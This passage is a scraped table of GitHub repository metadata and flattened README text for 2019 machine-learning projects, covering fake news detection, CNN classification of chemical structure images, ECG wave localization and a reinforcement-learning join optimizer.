emnlp07 data tgz Derived Works If you build on this work by this license you must provide me and the original authors in the paper attribution Doing otherwise goes against the MIT Open Source License LICENSE academic norms and is morally wrong Changelog An extensive changelog is available here CHANGELOG md License Copyright c 2019 Paul Landes Permission is hereby granted free of charge to any person obtaining a copy of this software and associated documentation files the Software to deal in the Software without restriction including without limitation the rights to use copy modify merge publish distribute sublicense and or sell copies of the Software and to permit persons to whom the Software is furnished to do so subject to the following conditions The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software THE SOFTWARE IS PROVIDED AS IS WITHOUT WARRANTY OF ANY KIND EXPRESS OR IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE paper http eecs csuohio edu sschung CIS660 RankShortTextCNNACM2015 pdf makefile makefile SpaCy https spacy io SQuAD https rajpurkar github io SQuAD explorer mean reciprocal rank https en wikipedia org wiki Meanreciprocalrank configuration file resources dlqa conf word2vec https code google com archive p word2vec BERT https github com google research bert Latent Semantic Analysis https en wikipedia org wiki Latentsemanticanalysis TREC QA trec qa data set,2019-07-14T01:22:03Z,2019-09-20T01:10:23Z,Python,plandes,User,0,1,0,4,master,plandes,1,0,0,0,0,0,0
GeospatialGeeks,Data-Science,n/a,,2019-06-29T17:16:37Z,2019-07-24T09:47:11Z,Jupyter Notebook,GeospatialGeeks,Organization,1,1,0,2,master,AhmadAmmar,1,0,0,0,0,0,0
shashankboosi,FakeNewsML,fakenewschallenge#machine-learning-algorithms#python3,Fake News ML Fake news challenge using ML DL Dataset Fake News Challenge Dataset http www fakenewschallenge org Running Installation If you are running the code for the first time Run the following commands in your python console 1 import nltk nltk download 2 Install contractions library which is used in the pre processing part pip install contractions 0 0 18 3 All the other libraries will come along with anaconda 4 If you want to experiment with the pre processing and feature extraction results you can delete the contents in the folders preprocesseddata and finalfeatures 5 You need to run the main py for the whole project to execute Implementation 1 dataimport py This file imports the data from the dataset and we use the competitiontest files to test the data 2 trainvalidationsplit py The train data that is imported from the csv files is split into 80 train and 20 validation to check the results before testing them on the test data 3 preprocess py We use different pre processing techniques like tokenize stopwords stem lemmatize for the text data 4 featureextraction py we mainly use three different concepts to extract features from the text They are 1 Sentence Weighting 2 Ngrams 2 grams 3 TF IDF Vectorizing 5 models py we mainly use four different ML algorithms to find the class labels They are 1 Random Forest Classifier 2 Decision Tree Classifier 3 Logistic Regression 4 Naive Bayes 6 metrics py We use different performance metrics like Competition Score Accuracy Precision Recall F1 score to evaluate our labels 7 score py This is the official scorer python file that is to be used to evaluate the results Results and Comparisons 1 Percentage of correctness for different stances for all the 5 algorithms we compare with correctness images correctness png 2 The accuracy score chart for the dataset is accuracy score images acctoscore PNG Report For detailed information about the repository please find the pdf attached in report report pdf,2019-07-25T03:45:21Z,2019-10-18T06:37:59Z,Python,shashankboosi,User,1,1,1,129,master,shashankboosi#con-mcleod#leonardlwq#dependabot[bot],4,0,0,0,0,0,11
pramit-marattha,python-AIBooks,n/a,python AIBooks Python Artificial Intelligence Machine Learning and Deep Learning Books,2019-07-30T14:47:09Z,2019-09-21T00:40:45Z,n/a,pramit-marattha,User,1,1,0,25,master,pramit-marattha,1,0,0,0,0,0,9
komalaftab,deeplearning,n/a,deeplearning deep learning requires familiarity with many simple mathematical concepts tensors tensor operations differentiation gradient descent and so on,2019-07-08T16:03:53Z,2019-07-11T06:41:33Z,Jupyter Notebook,komalaftab,User,0,1,0,4,master,komalaftab,1,0,0,0,0,0,0
16fabre,deep-aion,autoencoder#deep-learning#pytorch#time-series,deep aion This project gathers different deep learning models for time series classification anomaly detection generation Getting Started Prerequisites python3 pytorch Numpy pandas matplotlib seaborn Models The models py models py file contains all the implemented models Here is the list MLPAE A multi layer perceptron autoencoder CNNAE A convolutional 1D autoencoder LSTMAE A long short term memory autoencoder MLPVAE A multi layer perceptron variational autoencoder Data ECG5000 Running the tests Python script run py run py bash python run py Results ECG5000 MLPAE reconstruction img reconstruction png,2019-07-24T11:29:28Z,2019-10-23T03:26:52Z,Jupyter Notebook,16fabre,User,0,1,0,4,master,16fabre,1,0,0,0,0,0,0
cwolfbrandt,csk,n/a,Deep learning for organic chemistry utilizing deep learning techniques to identify chemical structures Carly Wolfbrandt images background jpg Table of Contents 1 Question Question 2 Introduction Introduction 1 Skeletal Formulas skeletalformulas 2 Simplified Molecular Input Line Entry System SMILES SMILES 3 Building Datasets database 1 Hydrocarbon Dataset hc 2 Small Chain Dataset sc 3 Convolutional Neural Network Model cnn 1 Small Data Problem and Image Augmentation using Keras small data 1 Image Augmentation Parameters aug 2 Model Hyperparameters hp 3 Model Architecture architecture 4 Hydrocarbon Training and Performance hcmodel 1 Training hctrain 2 Performance and Predictions hcperform 5 Small Chain Training and Performance scmodel 1 Training sctrain 2 Performance and Predictions scperform 6 Future Work future 1 Generative Adversarial Network gan 2 Generated Images images Question Can I build a model that can correctly classify images of chemical structures Introduction Skeletal Formulas The skeletal formula of a chemical species is a type of molecular structural formula that serves as a shorthand representation of a molecule s bonding and contains some information about its molecular geometry It is represented in two dimensions and is usually hand drawn as a shorthand representation for sketching species or reactions This shorthand representation is particularly useful in that carbons and hydrogens the two most common atoms in organic chemistry don t need to be explicitly drawn Table 1 Examples of different chemical species names molecular formulas and skeletal formulas Common Name IUPAC Name Molecular Formula Skeletal Formula coronene coronene C24H12 images 494155 494155 png biphenylene biphenylene C12H8 images 497397 497397 png 1 Phenylpropene E prop 1 enyl benzene C9H10 images 478708 478708 png Simplified Molecular Input Line Entry System SMILES SMILES is a line notation for describing the structure of chemical elements or compounds using short ASCII strings These strings can be thought of as a language where atoms and bond symbols make up the vocabulary The SMILES strings contain the same information as the structural images but are depicted in a different way SMILES strings use atoms and bond symbols to describe physical properties of chemical species in the same way that a drawing of the structure conveys information about elements and bonding orientation This means that the SMILES string for each molecule is synonymous with its structure and since the strings are unique the name is universal These strings can be imported by most molecule editors for conversion into other chemical representations including structural drawings and spectral predictions Table 2 SMILES strings contrasted with skeletal formulas Common Name IUPAC Name Molecular Formula Skeletal Formula Canonical SMILES coronene coronene C24H12 images 494155 494155 png C1 CC2 C3C4 C1C CC5 C4C6 C C C5 C CC7 C6C3 C C C2 C C7 biphenylene biphenylene C12H8 images 497397 497397 png C1 CC2 C3C CC CC3 C2C C1 1 Phenylpropene E prop 1 enyl benzene C9H10 images 478708 478708 png CC CC1 CC CC C1 Perhaps the most important property of SMILES as it relates to data science is that the datatype is quite compact SMILES structures average around 1 6 bytes per atom compared to skeletal image files which have an averge size of 4 0 kilobytes Building Datasets Since all chemical structures are unique this means that there is only one correct way to represent every chemical species This presents an interesting problem when trying to train a neural network to predict the name of a structure by convention the datasets are going to be sparse Hydrocarbon Dataset The dataset https github com cwolfbrandt cskdatabase edit master README md has 2 028 rows each with a unique name and link to a 300 x 300 pixel structural image as shown in Table 3 Table 3 Sample rows from the hydrocarbon dataset SMILES Image URL C CCC1 CC C c2ccccc2 c2ccccc12 https pubchem ncbi nlm nih gov rest pug compound smiles C CCC1 CC C c2ccccc2 c2ccccc12 PNG Cc1ccc C C c2ccccc12 https pubchem ncbi nlm nih gov rest pug compound smiles Cc1ccc C C c2ccccc12 PNG Cc1ccccc1C Cc1ccccc1 https pubchem ncbi nlm nih gov rest pug compound smiles Cc1ccccc1C Cc1ccccc1 PNG Generating the image URLs required URL encoding the SMILES strings since the strings can contain characters which are not safe for URLs This had the added benefit of making the SMILES strings safe for filenames as well The final training dataset was in a directory architected based on this blog post from the Keras website https blog keras io building powerful image classification models using very little data html where the filenames are URL encoded SMILES strings Small Chain Dataset This dataset has 9 691 rows each with a unique name and link to a 300 x 300 pixel structural image as shown in Table 4 It includes all of the classes from the hydrocarbon dataset as well as new short chain images which can include substituent atoms such as oxygen and nitrogen Table 4 Sample rows from the small chain dataset SMILES Image URL IC1CCCOCC1 https pubchem ncbi nlm nih gov rest pug compound smiles IC1CCCOCC1 PNG NC12CC1COC2 https pubchem ncbi nlm nih gov rest pug compound smiles NC12CC1COC2 PNG NCCCCC C https pubchem ncbi nlm nih gov rest pug compound smiles NCCCCC 3DC PNG Convolutional Neural Network Model CNNs take advantage of the fact that the input consists of images and they constrain the architecture in a more sensible way In particular unlike a regular Neural Network the layers of a CNN have neurons arranged in 3 dimensions width height depth Small Data Problem and Image Augmentation using Keras There has been a recent explosion in research of modeling methods geared towards big data Certainly data science as a discipline has an obsession with big data as focus has shifted towards development of specialty methods to effectively analyze large datasets However an often overlooked problem in data science is small data It is generally and perhaps incorrectly believed that deep learning is only applicable to big data It is true that deep learning does usually require large amounts of training data in order to learn high dimensional features of input samples However convolutional neural networks are one of the best models available for image classification even when they have very little data from which to learn Even so Keras documentation defines small data as 1000 images per class This presents a particular challenge for the hydrocarbon dataset where there is 1 image per class In order to make the most of the small dataset more images must be generated In Keras this can be done via the keras preprocessing image ImageDataGenerator class This method is used to augment each image generating a new image that has been randomly transformed This ensures that the model should never see the same picture twice which helps prevent overfitting and helps the model generalize better Image Augmentation Parameters Keras allows for many image augmentation parameters which can be found here https keras io preprocessing image The parameters used both for initial model building and for the final architecture are described below featurewisestdnormalization set input mean to 0 over the dataset feature wise featurewisecenter divide inputs by std of the dataset feature wise rotationrange degree range for random rotations widthshiftrange fraction of total width heightshiftrange fraction of total height shearrange shear angle in counter clockwise direction in degrees zoomrange range for random zoom lower upper 1 zoomrange 1 zoomrange rescale multiply the data by the value provided after applying all other transformations fillmode points nearest the outside the boundaries of the input are filled by the chosen mode When creating the initial small dataset for model building the following image augmentation parameters were used rotationrange 10 widthshiftrange 0 01 heightshiftrange 0 01 rescale 1 255 shearrange 0 01 zoomrange 0 01 horizontalflip False verticalflip False fillmode nearest Parameters 1 Initial set of image augmentation parameters for training images easy gif Figure 1 Sample molecule augmented using the above parameters rotationrange 40 widthshiftrange 0 2 heightshiftrange 0 2 rescale 1 255 shearrange 0 2 zoomrange 0 2 horizontalflip True verticalflip True fillmode nearest Parameters 2 Final set of image augmentation parameters for training images difficult gif Figure 2 Sample molecule augmented using the above parameters Model Hyperparameters model loss categorical crossentropy model optimizer Adam optimizer learning rate 0 0001 optimizer learning decay rate 1e 6 activation function ELU final activation function softmax The categorical crossentropy loss function is used for single label categorization where each image belongs to only one class The categorical crossentropy loss function compares the distribution of the predictions the activations in the output layer one for each class with the true distribution where the probability of the true class is 1 and 0 for all other classes The Adam optimization algorithm is different to classical stochastic gradient descent where gradient descent maintains a single learning rate for all weight updates Specifically the Adam algorithm calculates an exponential moving average of the gradient and the squared gradient and the parameters beta1 and beta2 control the decay rates of these moving averages The ELU activation function or exponential linear unit avoids a vanishing gradient similar to ReLUs but ELUs have improved learning characteristics compared to the other activation functions In contrast to ReLUs ELUs don t have a slope of 0 for negative values This allows the ELU function to push mean unit activations closer to zero zero means speed up learning because they bring the gradient closer to the unit natural gradient A comparison between ReLU and ELU activation functions can be seen in Figure 3 images eluvsrelu png Figure 3 ELU vs ReLU activation functions The softmax function highlights the largest values and suppresses values which are significantly below the maximum value The function normalizes the distribution of the predictions so that they can be directly treated as probabilities Model Architecture Sample layer of a simple CNN INPUT 50x50x3 will hold the raw pixel values of the image in this case an image of width 50 height 50 and with three color channels R G B CONV layer will compute the output of neurons that are connected to local regions in the input each computing a dot product between their weights and a small region they are connected to in the input volume ACTIVATION layer will apply an elementwise activation function leaving the volume unchanged POOL layer will perform a downsampling operation along the spatial dimensions width height resulting in a smaller volume The code snippet below is the architecture for the model a stack of 4 convolution layers with an ELU activation followed by max pooling layers python model Sequential model add Conv2D 32 3 3 inputshape 50 50 1 model add Activation elu model add MaxPooling2D poolsize 2 2 model add Conv2D 32 3 3 model add Activation elu model add MaxPooling2D poolsize 2 2 model add Conv2D 64 3 3 model add Activation elu model add MaxPooling2D poolsize 2 2 model add Conv2D 64 3 3 model add Activation elu model add MaxPooling2D poolsize 2 2 On top of this stack are two fully connected layers The model is finished with softmax activation which is used in conjunction with elu and categorical crossentropy loss to train our model python model add Flatten model add Dense 64 model add Activation elu model add Dropout 0 1 model add Dense 1458 model add Activation softmax model compile loss categoricalcrossentropy optimizer Adam lr 0 0001 decay 1e 6 metrics accuracy images architecture png Figure 4 AlexNet style CNN architecture Hydrocarbon Training and Performance Training In order to create a model with appropriately tuned hyperparameters I started training on a smaller dataset the initial training set had 2 028 classes specifically chosen due to the simplicity of the structures For each of the 2 028 classes I used the image augmentation parameters shown in Figure 1 and Parameters 1 to train on 250 batch images per class The accuracy and loss for this model can be seen in Figure 4 and Figure 5 images smalldatasettraining modelaccuracy1000 png Figure 5 Model accuracy for hydrocarbon model trained using simpler augmentation parameters images smalldatasettraining modelloss1000 png Figure 6 Model loss for hydrocarbon model trained using simpler augmentation parameters Using the hyperparameters and weights from this training model I started training using more difficult augmentation parameters Since structural images are valid even when they are flipped horizontally or vertically the model must learn to reognize these changes The augmented parameters can be seen in Figure 2 and Parameters 2 The accuracy and loss for this model can be seen in Figure 7 and Figure 8 images smalldatasettraining relu250acc0001flip png Figure 7 Model accuracy for model trained using wider augmentation parameters including horizontal vertical flipping images smalldatasettraining relu250loss0001flip png Figure 8 Model loss for model trained using wider augmentation parameters including horizontal vertical flipping Performance and Predictions Table 5 Sample predictions from hydrocarbon model Image to Predict Prediction 1 Percent Prediction 2 Percent Prediction 3 Percent images modeltestimages C CCc1ccc cc1 c1ccc CC C cc1 01342 png images modeltestimages C CCc1ccc cc1 c1ccc CC C cc1 C CCc1ccc cc1 c1ccc CC C cc1 png 97 4 images modeltestimages triplebond1 triplebond1 png 1 1 images modeltestimages C1C CC C1c1ccccc1 c1ccccc1 C1C CC C1c1ccccc1 c1ccccc1 png 0 5 images modeltestimages CC C Cc1ccccc1 c1ccccc1 0599 png images modeltestimages CC C c1ccccc1 c1ccccc1 CC C c1ccccc1 c1ccccc1 png 61 6 images modeltestimages Cc1cc C c C Cc2ccccc2C C c C c1 Cc1cc C c C Cc2ccccc2C C c C c1 png 33 0 images modeltestimages CC C Cc1ccccc1 c1ccccc1 CC C Cc1ccccc1 c1ccccc1 png 1 4 images modeltestimages CCCCCCCCCCCCCc1ccccc1 03361 png images modeltestimages CCCCCCCCCc1ccc cc1 c1ccccc1 CCCCCCCCCc1ccc cc1 c1ccccc1 png 70 5 images modeltestimages CCCCCCCCCCCCCc1ccccc1 CCCCCCCCCCCCCc1ccccc1 png 26 9 images modeltestimages triplebond2 triplebond2 png 1 7 images modeltestimages CCCCCCCCCCCCc1ccccc1 03080 png images modeltestimages CCCCCCCCc1ccccc1 CCCCCCCCc1ccccc1 png 62 7 images modeltestimages CCCCCCCCCCCCc1ccccc1 CCCCCCCCCCCCc1ccccc1 png 23 1 images modeltestimages C CCCCCCCc1ccccc1 C CCCCCCCc1ccccc1 png 3 5 images modeltestimages Cc1cccc C c1CCC C 0802 png images modeltestimages Cc1cccc C c1CCC C Cc1cccc C c1CCC C png 85 7 images modeltestimages single1 single1 png 11 0 images modeltestimages triplebond3 triplebond3 png 1 2 Small Chain Training and Performance Training Using the hyperparameters for the 2 028 class training model I s,2019-07-24T21:31:09Z,2019-08-02T19:25:40Z,HTML,cwolfbrandt,User,1,1,0,59,master,cwolfbrandt,1,0,0,0,0,0,0
KarKLi,Orange,n/a,Orange A simplified computer vision deep learning framework based on keras This library is still completing Contact me lijk8 at mail2 sysu edu cn academic email Usage import Orange Or from Orange import OrangeLinear Or from Orange import OrangeNonLinear,2019-08-01T13:32:43Z,2019-08-22T11:10:41Z,Python,KarKLi,User,1,1,0,18,master,KarKLi,1,0,0,0,0,0,1
sydney-machine-learning,BayesianRL,n/a,BayesianRL Bayesian RL using Deep Q learning,2019-07-12T06:54:52Z,2019-09-17T07:27:57Z,Python,sydney-machine-learning,Organization,1,1,0,2,master,rohitash-chandra#rishabhguptagithub,2,0,0,0,0,0,0
SamuelaAnastasi,PrivateAIChallenge_PATE,n/a,PrivateAIChallengePATE Differential Privacy for Deep Learning PATE Analysis,2019-07-02T18:27:05Z,2019-07-02T19:29:15Z,Jupyter Notebook,SamuelaAnastasi,User,0,1,0,4,master,SamuelaAnastasi,1,0,0,0,0,0,0
josephdviviano,brainhack-dl,n/a,brainhack deep learning 2019 Course materials for the brainhack 2019 deep learning course Online Resources https brainhack101 github io IntroDL https colab research google com github brainhack101 IntroDL blob master notebooks 2019 Rokem 2019RokemOHBMIntroDL ipynb Theory When to use classical ML vs DL Theory of optimizing deep learning networks linear regression MLP The importance of regularization Pitfalls of deep learning Practical Scikit learn baseline t SNE Make your own MLP that runs on MNIST in numpy Crash course in keras,2019-07-16T20:39:57Z,2019-07-27T23:04:09Z,Python,josephdviviano,User,1,1,0,7,master,josephdviviano,1,0,0,0,0,0,0
hadishamgholi,voxceleb2,n/a,Face Verification in blurred and profile faces https iust deep learning github io 972 config file for training recognition config py the default config is for MobileNet,2019-07-19T19:07:23Z,2019-07-27T00:29:30Z,Python,hadishamgholi,User,1,1,1,8,master,hadishamgholi,1,0,0,0,0,0,0
mezba1,cms-dl,n/a,Classroom Management System Deep Learning Core In progress,2019-07-10T11:32:48Z,2019-08-07T14:31:32Z,JavaScript,mezba1,User,0,1,0,2,master,mezba1,1,0,0,0,0,0,0
msarafzadeh,image-super-resolution,n/a,Super Image Resolution and Noise Reduction Using deep learning neural networks and CNNS to increase the resolution of a noisey image of size 64x64 pixels to a clean image of size 256x256 Reached an accuracy of 76 using Final Model Model 24 Watch presentation here https www youtube com watch v 2MgLZ7AdsJQ Created by Matityahu Sarafzadeh tags keras cnn computer vision deep learning neural networks,2019-06-25T11:28:04Z,2019-11-13T09:41:27Z,Jupyter Notebook,msarafzadeh,User,1,1,0,59,master,msarafzadeh,1,0,0,0,0,0,0
BusyDataForFS,ECGNet,cnn-1d#deeplearning#ecg#fcn#keras,ECG R wave and P wave localization in paper InProceedingsAbrishami2018 author H Abrishami and M Campbell and C Han and R Czosek and X Zhou title P QRS T localization in ECG using deep learning booktitle Proc IEEE EMBS Int Conf Biomedical Health Informatics BHI year 2018 pages 210 213 month mar doi 10 1109 BHI 2018 8333406 Since the code of this paper is not open I implemented the code according this paper with keras framework Data preprocess Data preprocessed in MATLAB Download data files from https www physionet org content qtdb 1 0 0 with downloadQTDB m PC will get xxxann mat for Y and xxxdata mat for X For input data to keras conveniently Segmentor m will segment all recording into complexes and position of P wave and R wave is also saved in segmentors mat if you load segmentor mat into matlab You will get segs with 96863 by 300 and anns with dimention of 96863 by 2 in workspace That mean there are 96863 complexes with length of 300 sampling points ann 1 presents position of P wave ann 2 presents position of R wave More detail can be found in paper models for fully connected net usage python python papermodelscodes denseNetPRlocalization py for 1D CNN usage python python papermodelscodes ECGNet py for 1D CNN with dropout usage python python papermodelscodes ECGNetDropout py,2019-11-26T09:31:18Z,2019-12-10T03:23:38Z,Python,BusyDataForFS,User,1,1,0,8,master,busyyang,1,0,0,0,0,0,0
antonismand,ReJOIN,python#tensorforce,ReJOIN An implementation of ReJOIN a learned join ordering optimizer as described in the following papers Rejoin Hands Free Query Optimizer through Deep Learning Ryan Marcus Olga Papaemmanouil https www cs brandeis edu olga publications HandsFreeCIDR19 pdf Deep Reinforcement Learning for Joining Enumaration Ryan Marcus Olga Papaemmanouil https www cs brandeis edu olga publications ReJOINaiDM18 pdf Some experiments https drive google com open id 1bOBtplkxfGXGRWmib4WYMotjJ47fGz2C Some Running examples Train target group 4 for 200 episodes sudo python3 main py e 200 g 1 tg 4 se 100 s savedmodel group4 200 Now the plots are in outputs folder default and the model in savedmodel Restore saved model and test group 4 sudo python3 main py e 3 g 1 tg 4 r savedmodel group4 200 testing o outputs testing Restore saved model and keep training on group 5 for 500 episodes sudo python3 main py e 200 g 1 tg 5 se 100 r savedmodel group4 200 s savedmodel group5 500 Execute a single query python main py query 3a episodes 150 Program parameters Agent configuration file a agent config default config ppo json Network specification file n network spec default config complex network json Number of episodes e episodes default 800 Total groups of different number of relations g groups default 1 Run specific group tg targetgroup default 5 Incremental Mode m mode default round Maximum number of timesteps per episode ti max timesteps default 20 Run specific query q query default Save agent to this dir s saveagent Restore Agent from this dir r restoreagent Test agent without learning use deterministic t testing action storetrue default False Order queries by relationsnum all runall default False Save agent every x episodes se save episodes default 100 Select phase 1 or 2 p phase default 1,2019-07-21T12:33:57Z,2019-10-17T02:40:51Z,TSQL,antonismand,User,0,1,0,83,master,DelphianCalamity#antonismand,2,0,0,0,0,0,0
AshishBarvaliya,Tensor-flow-algos-projects-,n/a,,2019-07-22T14:02:20Z,2019-08-23T18:16:48Z,Jupyter Notebook,AshishBarvaliya,User,0,1,0,1,master,AshishBarvaliya,1,0,0,0,0,0,0
jangmii,skkuuiux,n/a,,2019-06-24T06:07:57Z,2019-08-22T09:03:50Z,HTML,jangmii,User,1,1,0,20,master,superbunny38#jangmii,2,0,0,1,0,0,0
